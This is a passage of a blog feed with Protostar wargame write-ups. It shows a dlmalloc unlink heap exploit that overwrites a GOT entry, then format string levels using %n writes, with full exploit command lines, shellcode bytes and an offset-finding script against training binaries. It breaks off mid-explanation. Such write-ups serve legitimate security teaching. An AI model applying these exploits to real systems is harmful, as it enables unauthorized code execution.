-<p>This is the level that I thought more of these would be; this level requires us to manipulate heap metadata in order to obtain code execution.  Whilst this method is terribly outdated and not applicable at all to modern heaps, it&rsquo;s still a blast, and many of the high level methods still apply.</p>
-
-<p>I highly, highly recommend reading the essential <a href="http://phrack.org/issues/57/9.html"><em>Once Upon A Free()</em></a> if you&rsquo;re unfamiliar with old school, dlmalloc heap exploitation, as there is quite a bit of prerequisite knowledge necessary to complete this stage.  I&rsquo;ll assume the reader has a cursory understanding of how this process will go down.</p>
-
-<p>Much like the previous stages, we need to redirect the program to another function, <code>winner</code>.  Stage 3 executes three separate, 32 byte malloc&rsquo;s, strcpy&rsquo;s our input into each chunk, then free&rsquo;s them in <a href="http://webcache.googleusercontent.com/search?q=cache:TddtBQ76DO4J:exploit-exercises.com/protostar/heap3+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=us">reverse</a>:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>a = malloc(32);
-</span><span class='line'>b = malloc(32);
-</span><span class='line'>c = malloc(32);
-</span><span class='line'>
-</span><span class='line'>strcpy(a, argv[1]);
-</span><span class='line'>strcpy(b, argv[2]);
-</span><span class='line'>strcpy(c, argv[3]);
-</span><span class='line'>
-</span><span class='line'>free(c);
-</span><span class='line'>free(b);
-</span><span class='line'>free(a);</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Let&rsquo;s first check out the memory layout.  After all three allocations and strcpy&rsquo;s, but before any free&rsquo;s:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/10wx 0x804c008-8
-</span><span class='line'>0x804c000:  0x00000000  0x00000029  0x41414141  0x00000000
-</span><span class='line'>0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
-</span><span class='line'>0x804c020:  0x00000000  0x00000000
-</span><span class='line'>(gdb) x/10wx 0x804c030-8
-</span><span class='line'>0x804c028:  0x00000000  0x00000029  0x42424242  0x00000000
-</span><span class='line'>0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
-</span><span class='line'>0x804c048:  0x00000000  0x00000000
-</span><span class='line'>(gdb) x/10wx 0x804c058-8
-</span><span class='line'>0x804c050:  0x00000000  0x00000029  0x43434343  0x00000000
-</span><span class='line'>0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
-</span><span class='line'>0x804c070:  0x00000000  0x00000000
-</span><span class='line'>(gdb)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Recall that each chunk has metadata in-channel that allows dlmalloc to traverse, coalesce, and fetch chunks on the heap.  In the above case, three allocated chunks have two requisite fields: <code>prev_size</code> and <code>size</code>.  As none of the previous chunks in the heap have been free&rsquo;d, the<code>prev_size</code> field is 0x0.  The size field is 0x29, or 41.  The lower three bits are reserved in this field, so accounting for that:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) p/d 0x29 & ~3
-</span><span class='line'>$1 = 40
-</span><span class='line'>(gdb)      </span></code></pre></td></tr></table></div></figure>
-
-
-<p>These three chunks are then free&rsquo;d in reverse order, starting from chunk c.  Exploitation for this rather straight forward, we just need to overflow adjacent metadata headers to craft an illicit chunk.  Once free enters its unlink macro, we obtain execution flow control.</p>
-
-<p>We need to start by setting the <code>prev_size</code> and <code>size</code> fields to values that allow us to control forward and backward chunk pointers.  We begin by setting both fields to 0xffffffc, or -4.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*32 + "\xfc\xff\xff\xff"*2') BBBB CCCC
-</span><span class='line'>Starting program: /opt/protostar/bin/heap3 $(python -c 'print "A"*32 + "\xfc\xff\xff\xff"*2') BBBB CCCC
-</span><span class='line'>
-</span><span class='line'>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff824) at heap3/heap3.c:24
-</span><span class='line'>24  in heap3/heap3.c
-</span><span class='line'>(gdb) x/10wx 0x804c030-8
-</span><span class='line'>0x804c028:  0xfffffffc  0xfffffffc  0x42424242  0x00000000
-</span><span class='line'>0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
-</span><span class='line'>0x804c048:  0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We now shift to setting the flink and blink values, which are set once a chunk is freed.  Let&rsquo;s inspect these chunks after all three have been freed:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/10wx 0x804c008-8
-</span><span class='line'>0x804c000:  0x00000000  0x00000029  0x0804c028  0x00000000
-</span><span class='line'>0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
-</span><span class='line'>0x804c020:  0x00000000  0x00000000
-</span><span class='line'>(gdb) x/10wx 0x804c030-8
-</span><span class='line'>0x804c028:  0x00000000  0x00000029  0x0804c050  0x00000000
-</span><span class='line'>0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
-</span><span class='line'>0x804c048:  0x00000000  0x00000000
-</span><span class='line'>(gdb) x/10wx 0x804c058-8
-</span><span class='line'>0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
-</span><span class='line'>0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
-</span><span class='line'>0x804c070:  0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The value after the <code>size</code> field is a forward pointer to the next free chunk.  There would typically be another pointer in the next field, a backwards link, however, dlmalloc employs what&rsquo;s known as fastbins.  This is a singly-linked list holding recently freed small chunks ( &lt; 64 bytes).  More on this can be found <a href="ftp://g.oswego.edu/pub/misc/malloc-2.7.0.c">here</a>.</p>
-
-<p>Taking a quick peek at the exploitable unlink macro:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#define unlink(P, BK, FD)
-</span><span class='line'>{
-</span><span class='line'>  BK = P-&gt;bk;
-</span><span class='line'>  FD = P-&gt;fd;
-</span><span class='line'>  FD-&gt;bk = BK;
-</span><span class='line'>  BK-&gt;fd = FD;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This macro will essentially update chunk pointers to, naturally, unlink a recently freed chunk.  This boils down to:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>*(next-&gt;fd + 12) = next-&gt;bk
-</span><span class='line'>*(next-&gt;bk + 8) = next-&gt;fd</span></code></pre></td></tr></table></div></figure>
-
-
-<p>A simple write-what-where.  If we set fd to <code>return address - 0xc</code>, or the where, then bk is the what and ends up being the value popped into EIP.  Let&rsquo;s test this out by attempting to write 0x42424242 into chunk A:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*32 + "\xfc\xff\xff\xff"*2') $(python -c 'print "B"*4 + "\xfc\xbf\x04\x08" + "B"*4') CCCC
-</span><span class='line'>The program being debugged has been started already.
-</span><span class='line'>Start it from the beginning? (y or n) y
-</span><span class='line'>Starting program: /opt/protostar/bin/heap3 $(python -c 'print "A"*32 + "\xfc\xff\xff\xff"*2') $(python -c 'print "B"*4 + "\xfc\xbf\x04\x08" + "B"*4') CCCC
-</span><span class='line'>
-</span><span class='line'>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
-</span><span class='line'>24  in heap3/heap3.c
-</span><span class='line'>(gdb) ni 3
-</span><span class='line'>
-</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>0x08049906 in free (mem=0x804c030) at common/malloc.c:3638
-</span><span class='line'>3638    common/malloc.c: No such file or directory.
-</span><span class='line'>in common/malloc.c
-</span><span class='line'>(gdb) x/10wx 0x804c008-8
-</span><span class='line'>0x804c000:  0x00000000  0x00000029  0x42424242  0x41414141
-</span><span class='line'>0x804c010:  0x41414141  0x41414141  0x41414141  0x41414141
-</span><span class='line'>0x804c020:  0x41414141  0x41414141
-</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
-
-
-<p>So we can write a controlled value somewhere.  We&rsquo;ll take the path of least resistance for exploitation and overwrite the GOT entry for puts with the location of our shellcode, which will be a simple jump to the appropriate function.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump -t --dynamic-relo ./heap3 | grep puts
-</span><span class='line'>0804b128 R_386_JUMP_SLOT   puts</span></code></pre></td></tr></table></div></figure>
-
-
-<p>and winner:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) p winner
-</span><span class='line'>$2 = {void (void)} 0x8048864 &lt;winner&gt;</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Since our return address needs to be at an offset of -0xc, we&rsquo;ll be using <code>0x804b11c</code> as the return address.  It is also worth noting that the first field of the chunk is clobbered during the free routine, so we&rsquo;ll need an offset of +4 there as well.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r AAAA$(python -c 'print "A"*28 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\x41"*4 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC
-</span><span class='line'>The program being debugged has been started already.
-</span><span class='line'>Start it from the beginning? (y or n) y
-</span><span class='line'>
-</span><span class='line'>Starting program: /opt/protostar/bin/heap3 AAAA$(python -c 'print "A"*28 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\x41"*4 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC
-</span><span class='line'>
-</span><span class='line'>Breakpoint 1, 0x08048935 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
-</span><span class='line'>24  heap3/heap3.c: No such file or directory.
-</span><span class='line'>    in heap3/heap3.c
-</span><span class='line'>(gdb) x/i $eip
-</span><span class='line'>0x8048935 &lt;main+172&gt;:   call   0x8048790 &lt;puts@plt&gt;
-</span><span class='line'>(gdb) si
-</span><span class='line'>0x08048790 in puts@plt ()
-</span><span class='line'>(gdb) x/i $eip
-</span><span class='line'>0x8048790 &lt;puts@plt&gt;:   jmp    DWORD PTR ds:0x804b128
-</span><span class='line'>(gdb) ni
-</span><span class='line'>0x0804c00c in ?? ()
-</span><span class='line'>(gdb) x/wx $eip
-</span><span class='line'>0x804c00c:  0x41414141
-</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
-
-
-<p>This gives us about eight bytes until the clobbered field, but this is sufficient for our purposes.  Using metasm, we can generate shellcode for a simple <code>call winner</code>:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>metasm &gt; push 0x08048864; ret
-</span><span class='line'>"\x68\x64\x88\x04\x08\xc3"
-</span><span class='line'>metasm &gt; </span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./heap3 AAAA$(python -c 'print "\x68\x64\x88\x04\x08\xc3" + "A"*22 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\x41"*4 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC
-</span><span class='line'>that wasn't too bad now, was it? @ 1411285668
-</span><span class='line'>user@protostar:/opt/protostar/bin$ </span></code></pre></td></tr></table></div></figure>
-
-
-<p>And that&rsquo;s it!  I really wish this level had more dlmalloc exploitation, or post-2004 stuff (see <a href="http://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt">here</a>), but this was fun as is.  Fusion seems to be an advanced version of Protostar, so here&rsquo;s to hoping there&rsquo;s more there.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Protostar solutions - Format String]]></title>
-    <link href="http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings/"/>
-    <updated>2014-09-16T14:10:04-07:00</updated>
-    <id>http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings</id>
-    <content type="html"><![CDATA[<p>Wow it&rsquo;s been awhile since I&rsquo;ve taken a look at this box.  The last time I was here, I was working on the format string levels.  These levels have been done and documented to death, but hey, they&rsquo;re fun.  So, without further delay, lets begin.</p>
-
-<p>I&rsquo;ll be assuming you know what a format string is, and if not, you can follow allowing with <a href="http://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf">this</a> great paper.</p>
-
-<h2>Format String Level 00</h2>
-
-<p>This level really just points out that vulnerabilities exist in <code>sprintf</code>, and isn&rsquo;t too different from any of the easier stack levels.  All we&rsquo;ve got to do is overwrite an integer on the stack with 0xdeadbeef.  A 64 byte buffer is allocated, our target integer is assigned to 0 (after the allocated buffer), and <code>snprintf</code> invoked.  So 64 bytes of junk followed by 4 bytes should give us&hellip;</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c "print 'A'*64 + '\xef\xbe\xad\xde'")
-</span><span class='line'>Starting program: /opt/protostar/bin/format0 $(python -c "print 'A'*64 + '\xef\xbe\xad\xde'")
-</span><span class='line'>
-</span><span class='line'>Breakpoint 1, vuln (string=0xbffff95f 'A' &lt;repeats 64 times&gt;, "ﾭ", &lt;incomplete sequence \336&gt;) at format0/format0.c:15
-</span><span class='line'>15  in format0/format0.c
-</span><span class='line'>(gdb) x/wx &target
-</span><span class='line'>0xbffff75c: 0xdeadbeef
-</span><span class='line'>(gdb) x/wx &target-4
-</span><span class='line'>0xbffff74c: 0x41414141
-</span><span class='line'>(gdb) c
-</span><span class='line'>Continuing.
-</span><span class='line'>you have hit the target correctly :)</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Format String Level 01</h2>
-
-<p>Here&rsquo;s the first real format string vulnerability.  In it, <code>printf</code> is called without formatting specifiers, leading to a real format string vulnerability.  Our objective, like before, is to simply overwrite a static target variable, <code>target</code>, with anything.  Due to the variable not being on the local stack frame, we need to overwrite a specific address.  Let&rsquo;s first try and find that variable:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
-</span><span class='line'>08049638 g     O .bss   00000004              target
-</span><span class='line'>user@protostar:/opt/protostar/bin$ </span></code></pre></td></tr></table></div></figure>
-
-
-<p>Note that ASLR/PIE is disabled on the system, so we can safely use this address as our writable target.  Now in order to actually write something to this address, we need to traverse the stack until we reach our controlled data, then use the <code>%n</code> to write the number of bytes written into a pointer found on the stack, our data.  I wrote a little script to help me find the offset:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>import sys
-</span><span class='line'>from commands import getoutput
-</span><span class='line'>
-</span><span class='line'>run = "/opt/protostar/bin/format1 $(perl -e 'print \"AAAAAAAA\" . \"%08x.\"x{0}' . \"%x\")"
-</span><span class='line'>
-</span><span class='line'>print '[!] Searching for offset..'
-</span><span class='line'>for idx in range(1, 15000):
-</span><span class='line'>    tmp = getoutput(run.format(idx))
-</span><span class='line'>    tmps = tmp.split('.')[:-1]
-</span><span class='line'>    if '41414141' in tmps[len(tmps)-1]:
-</span><span class='line'>        print '[!] Format found at offset %d' % idx 
-</span><span class='line'>        print '[!] String: %s' % run.format(idx)
-</span><span class='line'>        break</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We accommodate for misaligned addresses by supplying 8 bytes and searching for 4.  When this runs, we get our offset:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ python ~/test.py
-</span><span class='line'>[!] Searching for offset..
-</span><span class='line'>[!] Format found at offset 133
-</span><span class='line'>[!] String: /opt/protostar/bin/format1 $(perl -e 'print "AAAAAAAA" . "%08x."x133' . "%x")
-</span><span class='line'>user@protostar:/opt/protostar/bin$ </span></code></pre></td></tr></table></div></figure>
-
-
-<p>All we need to do is get the alignment right, and we&rsquo;ve got our address:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(perl -e 'print "\x38\x96\x04\x08BAAAA" . "%08x."x132 . "%n"')
-</span><span class='line'>[snip]
-</span><span class='line'>Breakpoint 1, vuln (
-</span><span class='line'>                    string=0xbffff704 "8\226\004\bBAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%"...) at format1/format1.c:12
-</span><span class='line'>12  format1/format1.c: No such file or directory.
-</span><span class='line'>    in format1/format1.c
-</span><span class='line'>    (gdb) x/wx &target
-</span><span class='line'>    0x8049638 &lt;target&gt;: 0x000004ad
-</span><span class='line'>    (gdb) c
-</span><span class='line'>    Continuing.
-</span><span class='line'>    1.0000000f.bffff6db.00000000.00000000.d2000000.3398faa1.0022db30.da5bc6eb.6944a17d.00363836.00000000.00000000.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.00317461.you have modified the target :)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Note we replace the <code>%x</code> at the end with a <code>%n</code>, thus allowing us to write bytes into the specified address.</p>
-
-<h2>Format String Level 02</h2>
-
-<p>The learning curve after level 1 is much lower for the remaining two levels.  This level is identical to 1, except we need to actually write a specific value (0x64).  Let&rsquo;s begin by first finding our target address:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump -t format2 | grep target
-</span><span class='line'>080496e4 g     O .bss   00000004              target</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Modifying my script a bit (since input is now via fgets):</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ python /home/user/test.py 
-</span><span class='line'>[!] Searching for offset..
-</span><span class='line'>[!] Format found at offset 4
-</span><span class='line'>[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format2</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Not so far up the stack this time.  Lets plug in our address:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%x."x3 . "%n"') | /opt/protostar/bin/format2
-</span><span class='line'>��200.b7fd8420.bffff604.
-</span><span class='line'>target is 26 :(</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Not quite there.  Recall that we&rsquo;re writing the number of bytes printed; so we just need to jack up our output formatter, and&hellip;</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%19x."x3 . "%n"') | /opt/protostar/bin/format2
-</span><span class='line'>��                200.           b7fd8420.           bffff604.
-</span><span class='line'>you have modified the target :)</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Format String Level 03</h2>
-
-<p>This level requires us to more accurately write specific data to an address; lets again find our target:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump -t format3 | grep target
-</span><span class='line'>080496f4 g     O .bss   00000004              target</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And again running our script:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ python /home/user/test.py 
-</span><span class='line'>[!] Searching for offset..
-</span><span class='line'>[!] Format found at offset 12
-</span><span class='line'>[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x12' . "%x") | /opt/protostar/bin/format3</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And if we test this out:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "\xf4\x96\x04\x08" + "%x."*11 + "%n"' | /opt/protostar/bin/format3
-</span><span class='line'>��0.bffff5c0.b7fd7ff4.0.0.bffff7c8.804849d.bffff5c0.200.b7fd8420.bffff604.
-</span><span class='line'>target is 0000004c :(</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So we&rsquo;ve validated we can modify the target, but we need to modify all 4 bytes.  At this point, I discovered that we could simply continue to add on data to the value, pop out, and write another byte.  This, however, was tedious, and filled up my command line quickly.  It was at this point that I switched to using direct parameter access symbols.  Essentially, this allows us to directly access a variable from the stack, without having to continually pop values from it.  For example, if we wanted to access the 11th parameter, we would simply use <code>%11$x</code>.  If we return briefly to format1, we can see this in action below:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./format1 $(perl -e 'print "AAAAAA"')'_%128$x';printf "\n"
-</span><span class='line'>AAAAAA_41414141</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This is a much cleaner way of reading values off the stack.  Testing this on level 3:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "AAAABBBBCCCCDDDD" + "_%12$x_%13$x_%14$x_%15$x"' | ./format3
-</span><span class='line'>AAAABBBBCCCCDDDD_41414141_42424242_43434343_44444444
-</span><span class='line'>target is 00000000 :(</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And to verify we&rsquo;re there, we can substitute the characters for addresses, and replace the <code>$x</code> with a <code>$n</code> to write into those addresses:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%12$n%13$n%14$n%15$n"' | ./format3
-</span><span class='line'>��������
-</span><span class='line'>target is 10101010 :(</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Figuring out the correct padding values requires some simple math:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>first byte = 0x44 - 0x10
-</span><span class='line'>second     = 0x55 - 0x44
-</span><span class='line'>third      = 0x02 - 0x55</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Note we&rsquo;ve left off the fourth byte, we&rsquo;ll return to this in a second.  Simple math tells us that the first byte padding value should be 52:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%13$x%14$x%15$x"' | ./format3
-</span><span class='line'>��������                                                   080496f580496f680496f7
-</span><span class='line'>target is 00000044 :(</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The second byte is 17, and the third byte is -83, but if we wrap that we get 173 (0x02 &ndash; 0x55 &amp; 0xff).  This results in:</p>
-
